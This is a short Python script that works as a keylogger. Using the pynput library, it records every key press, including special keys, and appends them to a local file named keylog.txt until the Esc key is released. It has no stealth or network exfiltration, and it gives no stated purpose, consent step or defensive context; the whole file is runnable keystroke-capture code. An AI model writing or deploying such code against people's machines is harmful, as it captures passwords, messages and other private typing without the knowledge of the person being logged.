from pynput.keyboard import Listener

# Specify the file to save the logs
log_file = "keylog.txt"

# Function to log the key strokes
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        if key == key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        else:
            with open(log_file, "a") as f:
                f.write(f" {key} ")

# Function to handle release (not used here but required by Listener)
def on_release(key):
    if key == key.esc:
        return False

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
